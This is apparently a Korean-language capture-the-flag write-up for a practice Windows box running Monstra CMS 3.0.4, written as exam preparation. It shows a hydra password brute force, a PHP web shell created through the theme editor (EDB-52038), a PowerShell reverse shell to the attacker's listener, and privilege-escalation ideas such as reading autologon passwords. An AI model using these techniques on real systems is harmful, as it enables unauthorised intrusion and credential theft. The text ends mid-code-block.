@@ -1,0 +1,637 @@
+---
+tags:
+  - type/machine
+  - platform/pg
+  - os/windows
+  - status/partial
+  - tech/enum/dirbust
+  - tech/enum/searchsploit
+  - tech/cred/crack
+  - tech/payload/revshell
+type: machine
+platform: pg
+os: windows
+ip: 192.168.248.180
+ports: [80, 135, 139, 443, 445, 3389, 5040, 7680]
+services: [http, msrpc, netbios-ssn, ssl/http, microsoft-ds, ms-wbt-server]
+status: partial
+manual_tags: true
+manual_cves: true
+manual_status: true
+tech_count: 4
+---
+> [!info] PG Practice — **Monster** · Fundamental
+> **타겟** 192.168.248.180 · **OS** Windows 10 (빌드 10.0.19041, 호스트 `MIKE-PC`) · **난이도** Fundamental · **플래그 2개 중 1개 획득**
+> **경로 요약** tcp/80 XAMPP(Apache 2.4.41 / PHP 7.3.10) → `/blog` = **Monstra CMS 3.0.4** → `/blog/users` 가 사용자명 공개 → cewl+룰 사전으로 hydra → `admin:wazowski` → 관리자 패널 **themes → add_chunk** 로 PHP 파일 생성(EDB-52038) → `/blog/public/themes/default/*.chunk.php` RCE → PowerShell 리버스셸(tcp/443) → `C:\Users\mike\Desktop\local.txt`
+> **권한상승은 미완이다.** `proof.txt` 를 얻지 못했다. 열거를 시작하는 시점에 작업이 끊겼고, 그 사실과 다음 수를 §4·§6 에 남긴다.
+>
+> 작업일 2026-08-20. 당시 Kali `tun0` 은 **192.168.45.207** 이었다(LHOST 를 그대로 복사하지 마라). 타겟 로컬시각은 **UTC-7(PDT)**, Kali 는 UTC+9 다 — 아래 시각 표기가 섞이지 않게 매번 어느 쪽인지 밝힌다.
+
+## 0. 이 박스에서 배우는 것
+
+- **CMS가 사용자명을 공짜로 준다.** Monstra 의 `/blog/users` 는 인증 없이 전체 사용자 목록을 뿌린다. 사용자명을 아는 순간 브루트포스의 탐색공간이 두 자릿수로 줄어든다.
+- **사이트 본문에서 만든 사전이 rockyou 를 이긴다.** 여기 정답 `wazowski` 는 10k 상용 사전에는 없고 **사이트에 대문짝만하게 적혀 있었다.** cewl → 룰 확장 → hydra 가 정석이다.
+- **로그인 잠금이 서버가 아니라 쿠키에 있으면 잠금이 아니다.** 그리고 그 잠금은 **자동화가 아니라 손으로 하는 나를 잡는다**(§6-1).
+- **업로드가 막혀도 관리자 패널은 대개 PHP 를 쓸 수 있다.** 업로드 기능이 죽어 있어도 **테마/스니펫 에디터**가 남아 있으면 그게 곧 임의 파일 쓰기다.
+- **시험 출제 가능성** — Monstra 자체가 나올 확률은 낮다. 전이되는 것은 "무명 CMS + 버전 문자열 → 공개 익스플로잇은 대부분 **인증 필요** → 그러면 문제는 익스플로잇이 아니라 **크리덴셜**이다" 라는 순서 감각이다.
+
+## 1. 정찰
+
+### Nmap
+
+```
+ssh kali@10.44.44.128 "tmux new-session -d -s mon_nmap 'mkdir -p ~/PG/Monster && cd ~/PG/Monster && nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.248.180 2>&1 | tee nmap.full.txt; exec bash'"
+```
+
+`nnmap` 별칭(`~/.zshrc`)을 tmux 에 그대로 넣으면 안 된다. 별칭은 대화형 zsh 전용이라 비대화형 셸에서 확장되지 않고 스캔이 0초에 죽는다. 명령을 펼쳐서 쓴다.
+
+```
+# Nmap 7.98 scan initiated Thu Aug 20 20:09:05 2026 as: /usr/lib/nmap/nmap --privileged -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.248.180
+Nmap scan report for 192.168.248.180
+Host is up (0.091s latency).
+Not shown: 65521 closed tcp ports (reset)
+PORT      STATE SERVICE       VERSION
+80/tcp    open  http          Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.3.10)
+|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.3.10
+|_http-title: Mike Wazowski
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+443/tcp   open  ssl/http      Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.3.10)
+| tls-alpn: 
+|_  http/1.1
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: Mike Wazowski
+|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.3.10
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=localhost
+| Not valid before: 2009-11-10T23:48:47
+|_Not valid after:  2019-11-08T23:48:47
+445/tcp   open  microsoft-ds?
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+|_ssl-date: 2026-08-20T11:12:33+00:00; 0s from scanner time.
+| rdp-ntlm-info: 
+|   Target_Name: MIKE-PC
+|   NetBIOS_Domain_Name: MIKE-PC
+|   NetBIOS_Computer_Name: MIKE-PC
+|   DNS_Domain_Name: Mike-PC
+|   DNS_Computer_Name: Mike-PC
+|   Product_Version: 10.0.19041
+|_  System_Time: 2026-08-20T11:12:18+00:00
+| ssl-cert: Subject: commonName=Mike-PC
+| Not valid before: 2026-08-19T11:05:01
+|_Not valid after:  2027-02-18T11:05:01
+5040/tcp  open  unknown
+7680/tcp  open  pando-pub?
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+```
+
+출처: `~/PG/Monster/nmap.log`
+
+읽을 줄은 세 개다.
+
+`Apache 2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.3.10` — 이 세 버전 조합은 **XAMPP for Windows 7.3.10** 의 출하 조합이다. 뒤에서 `/phpmyadmin`·`/webalizer` 가 404 가 아니라 **403**(XAMPP 의 `Require local`)으로 답한 것, `/php-cgi/php-cgi.exe` 가 존재한 것이 두 번째·세 번째 독립 근거가 된다. 배너 하나로 XAMPP 라고 단정하지 않았다.
+
+`rdp-ntlm-info` 가 NLA 협상 과정에서 **호스트명·빌드를 그냥 뱉는다**(`MIKE-PC`, `10.0.19041`). 워크그룹 머신이고 도메인이 없다는 것도 여기서 확정된다.
+
+`5040`(CDPSvc)·`7680`(Delivery Optimization)·`49664~49669`(동적 RPC)는 Windows 10 기본 구성이다. 고포트는 부팅마다 바뀌므로 색인에서도 제외한다.
+
+UDP top-100 도 돌렸다. 열린 포트가 없었다(`nmap_udp.log`).
+
+### 디렉터리 열거
+
+```
+gobuster dir -u http://192.168.248.180/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,bak,zip -t 40 -o gobuster80.log
+```
+
+의미 있는 것만 추리면 이렇다(403 은 대부분 Windows 예약 디바이스명 `con`·`aux` 나 `*` 같은 잘못된 문자에 Apache 가 답한 것이라 소음이다):
+
+```
+/index.html           (Status: 200) [Size: 22916]
+/blog                 (Status: 301) [Size: 342] [--> http://192.168.248.180/blog/]
+/assets               (Status: 301) [Size: 344] [--> http://192.168.248.180/assets/]
+/Index.html           (Status: 200) [Size: 22916]
+/examples             (Status: 503) [Size: 1062]
+/Blog                 (Status: 301) [Size: 342] [--> http://192.168.248.180/Blog/]
+/Assets               (Status: 301) [Size: 344] [--> http://192.168.248.180/Assets/]
+/INDEX.html           (Status: 200) [Size: 22916]
+```
+
+출처: `~/PG/Monster/gobuster80.log` (ANSI 색코드 제거 후)
+
+443 은 80 과 `ETag`·`Last-Modified`·`Content-Length` 가 전부 같다. 같은 문서루트다. 따로 팔 것이 없다.
+
+### Monstra 3.0.4
+
+`/blog/` 의 응답 헤더와 본문에 두 가지가 같이 나온다.
+
+```
+<meta name="robots" content="index, follow"><meta name="generator" content="Powered by Monstra 3.0.4" />
+<link rel="stylesheet" href="http://monster.pg/blog/public/assets/css/bootstrap.css" type="text/css" />
+```
+
+`generator` 메타가 버전을, 자산 링크가 **vhost `monster.pg`** 를 알려준다. `siteurl` 옵션에 호스트명이 박혀 있어서 IP 로 접근해도 링크·리다이렉트가 전부 `monster.pg` 로 나간다. Kali `/etc/hosts` 에 한 줄 넣고 시작한다.
+
+```
+ssh kali@10.44.44.128 "grep -q monster.pg /etc/hosts || echo '192.168.248.180 monster.pg' | sudo tee -a /etc/hosts"
+```
+
+버전의 두 번째 근거는 푸터의 `Powered by Monstra 3.0.4` 다. 그리고 **소스를 클론해 대조**했다(`git clone https://github.com/monstra-cms/monstra`) — `engine/Monstra.php` 의 `const VERSION = '3.0.4'` 와 일치한다. 이 클론은 이후 익스플로잇 판단의 1차 사료가 된다.
+
+### 사용자명은 그냥 준다
+
+```
+$ curl -s 'http://monster.pg/blog/users' | sed -e 's/<[^>]*>/ /g'
+ ...
+ Users 
+ admin 
+ mike 
+```
+
+`/blog/users/1`, `/blog/users/2` 는 이메일까지 준다 — `wazowski@monster.pg`, `mike@monster.pg`. (HTML 엔티티로 난독화돼 있지만 브라우저가 풀어준다.)
+
+**사용자가 둘뿐이라는 사실이 뒤의 브루트포스를 현실적으로 만든다.** 이 박스의 서버 상한은 실측 70 req/s 였는데, 사용자를 모른 채 사전을 돌렸다면 계정 후보만큼 곱해져 손을 못 댔을 것이다.
+
+## 2. 취약점 분석
+
+### 공개 익스플로잇은 전부 「인증 필요」다
+
+```
+$ searchsploit monstra
+ Monstra CMS 3.0.4 - (Authenticated) Arbitrary ... | php/webapps/43348.txt
+ Monstra CMS 3.0.4 - Authenticated Arbitrary F ... | php/webapps/48479.txt
+ Monstra CMS 3.0.4 - Remote Code Execution (Au ... | php/webapps/49949.py
+ Monstra CMS 3.0.4 - Remote Code Execution (RC ... | php/webapps/52038.py
+```
+
+셋을 읽어보면 전부 관리자/에디터 세션을 전제한다.
+
+- **EDB-48479 / CVE-2017-18048** — filesmanager 에 `.php7` 업로드
+- **EDB-49949 / CVE-2018-6383** — 같은 곳에 `.pht`·`.phar` 업로드
+- **EDB-52038** — themes 의 `add_chunk` 로 PHP 파일 **생성**
+
+`plugins/box/filesmanager/filesmanager.admin.php` 의 금지 확장자 목록을 열어보면 왜 앞의 둘이 성립하는지 바로 보인다.
+
+```php
+$forbidden_types = array('html', 'htm', 'js', 'jsb', 'mhtml', 'mht',
+                         'php', 'phtml', 'php3', 'php4', 'php5', 'phps',
+                         'shtml', 'jhtml', 'pl', 'py', 'cgi', 'sh', 'ksh', 'bsh', 'c', 'htaccess', 'htpasswd',
+                         'exe', 'scr', 'dll', 'msi', 'vbs', 'bat', 'com', 'pif', 'cmd', 'vxd', 'cpl', 'empty');
+```
+
+`php7`·`pht`·`phar` 가 없다. 블랙리스트가 `php5` 까지만 세고 멈춘 전형적인 사례다. XAMPP 의 `httpd-xampp.conf` 는 이 확장자들도 PHP 핸들러에 물린다.
+
+그래서 **문제는 익스플로잇이 아니라 크리덴셜**이라는 결론이 선다. 여기서 방향을 바꿨다.
+
+### 로그인 잠금은 쿠키에 있다
+
+`admin/index.php` 를 읽는다.
+
+```php
+if (Request::post('login_submit')) {
+    if (Cookie::get('login_attempts') && Cookie::get('login_attempts') >= 5) {
+        $login_error = __('You are banned for 10 minutes. Try again later', 'users');
+    } else {
+        $user = $users->select("[login='" . trim(Request::post('login')) . "']", null);
+        if (count($user) !== 0) {
+            if ($user['login'] == Request::post('login')) {
+                if (trim($user['password']) == Security::encryptPassword(Request::post('password'))) {
+                    if ($user['role'] == 'admin' || $user['role'] == 'editor') {
+```
+
+세 가지가 한꺼번에 정해진다.
+
+1. **잠금 상태가 `login_attempts` 쿠키에 있다.** 서버는 카운터를 갖고 있지 않다. 쿠키를 안 보내는 클라이언트(=hydra)는 잠금을 아예 못 받는다. 반대로 **쿠키 단지를 재사용하는 `curl` 은 6번째 시도부터 밴 화면을 받는다.** 이게 §6-1 의 사고다.
+2. `select("[login='...']")` 는 XPath 인젝션 자리로 보이지만, **바로 다음 줄의 `$user['login'] == Request::post('login')`** 이 막는다. 인젝션 문자열을 넣으면 반환된 사용자의 `login` 필드와 POST 원문이 달라져서 통과하지 못한다. `[hash=...]` 를 쓰는 비밀번호 재설정 경로도 똑같은 형태로 막혀 있다.
+3. **비밀번호가 맞아도 role 이 admin/editor 가 아니면 `$login_error` 가 설정되지 않는다.** 즉 "Wrong ..." 문자열이 응답에 없다. hydra 를 실패조건 `Wrong` 으로 돌리면 **role 이 낮은 정답 비밀번호까지 히트로 잡힌다.** 실패조건을 고를 때 이 분기를 보고 골랐다.
+
+### 왜 사전을 직접 만들었나
+
+10k 상용 사전(`seclists/.../10k-most-common.txt`)을 두 사용자에 다 돌려 20,000 시도 — 9분, 무소득.
+
+rockyou 는 계산상 불가능하다. 서버 처리량을 실측해 봤다.
+
+```
+$ time (for i in $(seq 1 200); do curl -s -o /dev/null -m 30 -d 'login=admin&password=x&login_submit=Log+In' http://192.168.248.180/blog/admin/index.php & done; wait)
+( for i in $(seq 1 200); do; curl -s -o /dev/null -m 30 -d   &; done; wait; )  1.51s user 0.83s system 81% cpu 2.865 total
+```
+
+200요청/2.87초 = **약 70 req/s**. rockyou 1,434만 개는 이 속도로 **56시간**이다. 시험이었으면 여기서 접었어야 한다.
+
+대신 사이트 본문을 사전으로 만든다.
+
+```
+cewl -d 3 -m 4 -w cewl.txt http://192.168.248.180/
+cewl -d 3 -m 4 -w cewl_blog.txt http://monster.pg/blog/
+cat cewl.txt cewl_blog.txt | sort -u > words.txt          # 253 단어
+hashcat --stdout -r /usr/share/hashcat/rules/best66.rule words.txt | sort -u > words_b66.txt   # 14,579
+```
+
+`-m 4` 는 4글자 미만을 버린다. `-d 3` 은 링크를 3단계까지 따라간다(이 사이트는 한 장짜리라 큰 의미는 없지만 `/blog` 쪽 하위 페이지를 긁는 데 쓰였다). `best66.rule` 은 대소문자·숫자꼬리·리트 치환 같은 흔한 변형 66개를 붙인다.
+
+## 3. Foothold
+
+### 크리덴셜
+
+```
+hydra -I -L users.txt -P words_b66.txt -t 64 192.168.248.180 \
+  http-post-form "/blog/admin/index.php:login=^USER^&password=^PASS^&login_submit=Log+In:Wrong"
+```
+
+`-I` 는 이전 세션의 `hydra.restore` 확인 프롬프트를 건너뛴다(tmux 안에서 돌릴 때 10초를 잡아먹는다). 마지막 콜론 뒤 `Wrong` 은 **실패 조건**이다 — 응답에 이 문자열이 있으면 실패로 친다.
+
+```
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 29158 login tries (l:2/p:145
+79), ~456 tries per task
+[DATA] attacking http-post-form://192.168.248.180:80/blog/admin/index.php:login=
+^USER^&password=^PASS^&login_submit=Log+In:Wrong
+[STATUS] 2256.00 tries/min, 2256 tries in 00:01h, 26902 to do in 00:12h, 64 acti
+ve
+[STATUS] 1927.67 tries/min, 5783 tries in 00:03h, 23375 to do in 00:13h, 64 acti
+ve
+[STATUS] 1835.86 tries/min, 12851 tries in 00:07h, 16307 to do in 00:09h, 64 act
+ive
+[80][http-post-form] host: 192.168.248.180   misc: /blog/admin/index.php:login=^
+USER^&password=^PASS^&login_submit=Log+In:Wrong   login: admin   password: wazow
+ski
+```
+
+출처: `tmux capture-pane -pt mon_hydra2` (Kali 20:36 KST)
+
+**`admin` / `wazowski`.** 사이트 제목이 "Mike Wazowski" 다. 사전에 있던 단어 그대로다.
+
+> [!tip] 수동 대안
+> hydra 는 시험에서 허용된다. 그래도 도구 없이 같은 일을 하는 형태를 적어둔다 — 실패 조건이 응답 본문에 있으므로 셸 한 줄이면 된다.
+> ```
+> while read p; do
+>   if ! curl -s -d "login=admin&password=$p&login_submit=Log+In" \
+>        http://TARGET/blog/admin/index.php | grep -q Wrong; then echo "HIT: $p"; fi
+> done < words_b66.txt
+> ```
+> **쿠키 옵션(`-b`/`-c`)을 붙이면 안 된다.** 붙이는 순간 5회 만에 밴 화면을 받고 이후 전부 오탐이 된다(§6-1).
+
+### 관리자 패널
+
+```
+$ curl -s -i -c a.jar -d 'login=admin&password=wazowski&login_submit=Log+In' 'http://192.168.248.180/blog/admin/index.php' | head -12
+HTTP/1.1 302 302 Found
+Date: Thu, 20 Aug 2026 11:37:20 GMT
+Server: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.3.10
+X-Powered-By: PHP/7.3.10
+Set-Cookie: PHPSESSID=d1nu49vbucca99uk2j675oifn6; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Location: index.php
+Content-Length: 0
+Content-Type: text/html; charset=UTF-8
+```
+
+302 + `Location: index.php` 가 로그인 성공의 표식이다(실패는 200 + "Wrong ...").
+
+### 업로드가 죽어 있다
+
+먼저 정석대로 `.php7` 업로드를 시도했다.
+
+```
+$ curl -s -b a.jar -c a.jar -F "csrf=$csrf" -F 'file=@shell.php7;filename=shell.php7' -F 'upload_file=Upload' \
+    'http://192.168.248.180/blog/admin/index.php?id=filesmanager&path=uploads/'
+$ curl -s -b a.jar 'http://192.168.248.180/blog/admin/index.php?id=filesmanager&path=uploads/' | grep -oE 'message *: *"[^"]*"'
+message : "File was not uploaded"
+```
+
+확장자를 의심해 `.txt`·`.jpg` 로도 해봤다.
+
+```
+t.txt -> message : "File was not uploaded"
+t.jpg -> message : "File was not uploaded"
+```
+
+**확장자 문제가 아니라 업로드 자체가 죽어 있다.** `filesmanager.admin.php` 에서 이 문구가 나오는 갈래는 `$_FILES['file']` 이 비었거나 `move_uploaded_file()` 이 실패한 경우다. 어느 쪽인지는 `php.ini` 를 못 읽어 확인하지 못했다 — `file_uploads=Off` 가 가장 그럴듯하지만 **`[가정]`** 이다.
+
+### themes → add_chunk (EDB-52038)
+
+업로드가 아니라 **에디터**로 간다. Monstra 관리자 패널의 테마 편집기는 `.chunk.php` 파일을 새로 만들 수 있고, 그 파일은 `public/themes/<theme>/` 밑에 그대로 떨어져 **웹에서 직접 실행된다.**
+
+```
+curl -s -b a.jar -c a.jar \
+  --data-urlencode 'csrf=ad97499bc94b7df8726fdd354384c172f1062dfe' \
+  --data-urlencode 'name=mon9x' \
+  --data-urlencode 'content@chunk_payload.php' \
+  --data-urlencode 'add_file=Save' \
+  'http://192.168.248.180/blog/admin/index.php?id=themes&action=add_chunk'
+```
+
+`chunk_payload.php` 내용:
+
+```php
+<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; system($_REQUEST["cmd"]); echo "</pre>"; } ?>
+```
+
+`--data-urlencode 'content@파일'` 형태를 쓴 이유가 있다. 페이로드에 `<`·`>`·`$`·`"` 가 전부 들어 있어서 SSH 를 한 번 더 거치는 이 환경에서는 인용부호가 두 번 깨진다. 실제로 처음엔 `<pre>` 의 `<` 가 리다이렉션으로 해석돼 원격 bash 가 `pre: No such file or directory` 를 뱉었다. **파일에서 읽어 URL 인코딩까지 curl 에 맡기면 인용 문제가 사라진다.**
+
+CSRF 토큰은 같은 세션에서 `?id=themes&action=add_chunk` 페이지를 GET 해서 뽑는다(`name="csrf" value="..."`). Monstra 의 토큰은 세션 단위라 한 번 뽑으면 계속 쓸 수 있다.
+
+```
+$ curl -s 'http://192.168.248.180/blog/public/themes/default/mon9x.chunk.php?cmd=whoami'
+<pre>mike-pc\mike
+</pre>
+```
+
+RCE. 실행 계정은 `mike-pc\mike` — Apache 가 SYSTEM 서비스가 아니라 **mike 로 돌고 있다.**
+
+### 대화형 셸
+
+> [!danger] 웹셸로 읽은 플래그는 OSCP 에서 0점이다
+> 규정 원문이 *"this includes any type of web-based shell"* 이다. 위 `?cmd=` 는 **리버스셸을 던지는 데만** 쓰고, 플래그는 반드시 대화형 셸에서 읽는다.
+
+리스너를 먼저 띄운다. 비대화형 SSH 는 호출이 끝나면 자식을 죽이므로 tmux 안이어야 한다.
+
+```
+ssh kali@10.44.44.128 "tmux new-session -d -s mon_lsnr443 'rlwrap nc -lvnp 443; exec bash'"
+```
+
+PowerShell 리버스셸을 UTF-16LE base64 로 만들어 `-e` 로 넘긴다.
+
+```
+iconv -f UTF-8 -t UTF-16LE ps_rev.ps1 | base64 -w0 > ps_rev.b64
+B64=$(cat ps_rev.b64)
+curl -s -G --data-urlencode "cmd=powershell -nop -w hidden -e $B64" \
+  'http://192.168.248.180/blog/public/themes/default/mon9x.chunk.php' -m 25
+```
+
+`-G` 는 `--data-urlencode` 를 POST 본문이 아니라 **쿼리스트링**으로 붙인다. base64 에는 `+`·`/`·`=` 가 들어가므로 인코딩 없이 그대로 URL 에 붙이면 `+`가 공백으로 뒤집힌다. curl 이 이걸 처리하게 맡긴다.
+
+`-w hidden` 은 창을 안 띄우고, `-nop` 은 프로필 로딩을 건너뛴다(프로필이 뭔가 출력하면 셸 파서가 오염된다).
+
+```
+listening on [any] 443 ...
+connect to [192.168.45.207] from (UNKNOWN) [192.168.248.180] 50544
+whoami; hostname
+mike-pc\mike
+Mike-PC
+PS C:\xampp\htdocs\blog\public\themes\default>
+```
+
+첫 시도에 tcp/443 으로 바로 붙었다. 아웃바운드 제한도 Defender 차단도 없었다.
+
+## 4. 권한상승
+
+**여기서 작업이 끊겼다.** 열거를 시작하는 시점에 실행 도구가 막혀 `whoami /all` 이후로 진행하지 못했다. 확보한 것과 그로부터 **좁혀진 후보**만 적는다. 나머지는 안 해본 것이다.
+
+```
+PS C:\xampp\htdocs\blog\public\themes\default> whoami /all
+
+USER INFORMATION
+----------------
+
+User Name    SID
+============ ==============================================
+mike-pc\mike S-1-5-21-2619112490-2635448554-1147358759-1002
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                             Type             SID          Attributes
+
+====================================== ================ ============ ===========
+=======================================
+Everyone                               Well-known group S-1-1-0      Mandatory g
+roup, Enabled by default, Enabled group
+BUILTIN\Remote Desktop Users           Alias            S-1-5-32-555 Mandatory g
+roup, Enabled by default, Enabled group
+BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory g
+roup, Enabled by default, Enabled group
+NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory g
+roup, Enabled by default, Enabled group
+CONSOLE LOGON                          Well-known group S-1-2-1      Mandatory g
+roup, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory g
+roup, Enabled by default, Enabled group
+NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory g
+roup, Enabled by default, Enabled group
+NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory g
+roup, Enabled by default, Enabled group
+LOCAL                                  Well-known group S-1-2-0      Mandatory g
+roup, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory g
+roup, Enabled by default, Enabled group
+Mandatory Label\Medium Mandatory Level Label            S-1-16-8192
+
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                          State
+============================= ==================================== ========
+SeShutdownPrivilege           Shut down the system                 Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
+SeUndockPrivilege             Remove computer from docking station Disabled
+SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
+SeTimeZonePrivilege           Change the time zone                 Disabled
+
+PS C:\xampp\htdocs\blog\public\themes\default>
+```
+
+이 한 화면에서 읽히는 것.
+
+**`SeImpersonatePrivilege` 가 없다.** Potato 계열(JuicyPotato·PrintSpoofer·GodPotato)은 전부 후보에서 빠진다. Windows 서비스 계정에서 튀어나온 셸이면 거의 항상 있는 권한인데 없다는 것이, 아래 두 번째 관측과 맞물린다.
+
+**`NT AUTHORITY\INTERACTIVE` 와 `CONSOLE LOGON` 이 붙어 있다.** 서비스 토큰에는 이게 안 붙는다. 즉 Apache 는 서비스로 등록된 게 아니라 **mike 의 로그온 세션에서 돌아가는 대화형 프로세스**다(XAMPP Control Panel 을 로그온 시 띄우는 전형적 구성). 그러면 **자동 로그온이 켜져 있을 가능성**이 높고, 그건 레지스트리에 평문 비밀번호가 있다는 뜻이다.
+
+**`BUILTIN\Remote Desktop Users` 에 이미 들어 있다.** mike 의 평문 비밀번호를 얻으면 3389 로 갈아탈 수 있다.
+
+### 안 해본 것 — 우선순위 순
+
+전부 **시도하지 않음**이다. 근거는 위 관측이지 실측이 아니다.
+
+1. `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"` — `AutoAdminLogon`/`DefaultPassword`. 위의 INTERACTIVE 관측 때문에 1순위다.
+2. `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` (+ `HKCU`) — 둘 다 1이어야 성립한다.
+3. `Get-CimInstance Win32_Service | ? { $_.PathName -notmatch 'C:\\Windows\\' }` — 비따옴표 경로, 쓰기 가능한 서비스 바이너리.
+4. `schtasks /query /fo LIST /v` — 상위 권한으로 도는 작업.
+5. `C:\xampp\` 아래 설정 — `php.ini`(§3 의 업로드 실패 원인도 여기서 확정된다), `my.ini`, `phpMyAdmin\config.inc.php`. **MySQL 비밀번호가 mike 의 Windows 비밀번호와 같은 경우가 흔하다.**
+6. `netstat -ano` — 3306 같은 로컬 전용 리스너.
+
+> [!warning] 낮은 권한에서의 「없음」은 결론이 아니다
+> `whoami /all` 한 번으로 "특권 없음"을 확정하지 마라. Administrator 를 잡으면 **같은 열거를 다시 돌려야 한다** — 낮은 권한에서 안 보이던 서비스·작업·파일이 올라가면 보인다. Linux 쪽에서 `find / -perm -4000` 이 `/home/*` 의 `drwxr-x---` 때문에 커스텀 SUID 를 통째로 놓친 것과 같은 함정이다.
+
+## 5. 플래그
+
+`local.txt` 만 확보했다. **2026-08-20 인스턴스의 값**이다 — PG 는 박스를 다시 켤 때마다 플래그를 새로 만든다.
+
+| 플래그 | 경로 | 값 |
+|---|---|---|
+| local | `C:\Users\mike\Desktop\local.txt` | `db85d2fa7033db43da92bb07dde4da5b` |
+| proof | `C:\Users\Administrator\Desktop\proof.txt` (추정) | **미확보** |
+
+시험 증거 형식대로 한 화면에 담았다.
+
+```
+PS C:\xampp\htdocs\blog\public\themes\default> cmd /c "whoami & hostname & ipcon
+fig | findstr IPv4 & date /t & time /t & type C:\Users\mike\Desktop\local.txt"
+mike-pc\mike
+Mike-PC
+   IPv4 Address. . . . . . . . . . . : 192.168.248.180
+Thu 08/20/2026
+04:40 AM
+db85d2fa7033db43da92bb07dde4da5b
+PS C:\xampp\htdocs\blog\public\themes\default>
+```
+
+PowerShell 안에서 `cmd /c "... & ... & ..."` 로 감싼 이유는, PowerShell 에서는 `&` 가 호출 연산자라 명령 구분자로 쓸 수 없기 때문이다(`;` 를 쓰거나 이렇게 cmd 에 넘긴다). 타겟 시각 `04:40 AM` 은 UTC-7 이다 — 같은 순간의 Kali 시각은 20:40 KST 였다.
+
+## 6. 막혔던 지점 / 시행착오
+
+### 1. 정답을 손으로 이미 때렸는데 밴 화면을 받고 있었다 — 25분
+
+20:11 KST 에 수동으로 7개 조합을 돌렸다.
+
+```
+for p in admin password monstra admin123 Password123 mike wazowski; do
+  out=$(curl -s -m 20 -c ck.txt -b ck.txt -d "login=admin&password=$p&login_submit=Log+In" \
+        'http://192.168.248.180/blog/admin/' -o /dev/null -w '%{http_code} %{redirect_url} %{size_download}')
+  echo "admin:$p -> $out"
+done
+```
+
+```
+admin:admin -> 200  8507
+admin:password -> 200  8507
+admin:monstra -> 200  8507
+admin:admin123 -> 200  8507
+admin:Password123 -> 200  8507
+admin:mike -> 200  8513
+admin:wazowski -> 200  8513
+```
+
+**`-c ck.txt -b ck.txt` 로 쿠키 단지를 7번 공유한 것**이 문제였다. 실패할 때마다 `login_attempts` 가 1씩 올라가서 6번째부터 5에 도달했고, 그때부터 서버는 비밀번호를 아예 검사하지 않고 "You are banned for 10 minutes" 를 돌려줬다. 7번째가 정답 `wazowski` 였다.
+
+**증거는 화면에 있었다.** 앞의 다섯은 8507, 뒤의 둘만 8513. 6바이트 차이. 그걸 보고도 "플래시 메시지가 쌓였겠지"로 넘겼다. 더 나쁘게는, 곧바로 쿠키 없이 두 응답을 다시 받아 `diff` 를 떠서 **차이 없음**을 확인하고 오판을 확정지었다 — 쿠키가 없으니 밴이 안 걸린 게 당연했다.
+
+교훈 두 개.
+- **로그인 시도를 반복할 때 쿠키 단지를 공유하지 마라.** 시도마다 `-c` 를 새 파일로 하거나 아예 쿠키 옵션을 빼라.
+- **응답 크기 차이는 반드시 본문을 열어봐라.** "왜 다른지"를 설명하지 못하면 넘어가면 안 된다. 재현 조건(쿠키 유무)을 바꿔서 뜬 diff 는 원래 관측을 반증하지 못한다.
+
+이 사고 덕에 hydra 가 왜 통했는지도 설명된다. **잠금이 클라이언트 쿠키에 있어서 쿠키를 안 보내는 hydra 는 잠금을 못 받는다.** 소스를 읽고서야 알았다.
+
+### 2. 캡차 우회에 시간을 썼는데 애초에 갈 수 없는 길이었다 — 15분
+
+`/blog/users/registration` 이 열려 있길래 가입 → 권한상승을 노렸다. cryptographp 캡차가 막고 있어서 이미지를 받아봤다.
+
+```
+$ curl -sL -b reg.jar -c reg.jar 'http://monster.pg/blog/plugins/captcha/crypt/cryptographp.php?cfg=0&' -o cap.png
+$ file cap.png
+cap.png: PNG image data, 130 x 40, 8-bit/color RGB, non-interlaced
+$ python3 -c "from PIL import Image; from collections import Counter; print(Counter(Image.open('cap.png').convert('RGB').getdata()).most_common(8))"
+[((255, 255, 255), 4781), ((191, 191, 191), 336), ((128, 2, 0), 43), ((9, 96, 8), 31), ((202, 48, 54), 1), ((28, 82, 53), 1), ((134, 133, 129), 1), ((162, 239, 5), 1)]
+```
+
+흰 배경 + 회색 점 + 빨간 선 + 초록 호. **글자 픽셀이 없다.** `cryptographp.inc.php` 는 `imagettftext()` 로 TTF 를 그리는데 폰트 로드가 실패하면 아무것도 안 그려지고 잡음만 남는다. 읽을 방법이 없다.
+
+`answer=` 를 비워 우회를 시도했지만 실패했다. `cryptographp.fct.php` 를 보면 이유가 명확하다.
+
+```php
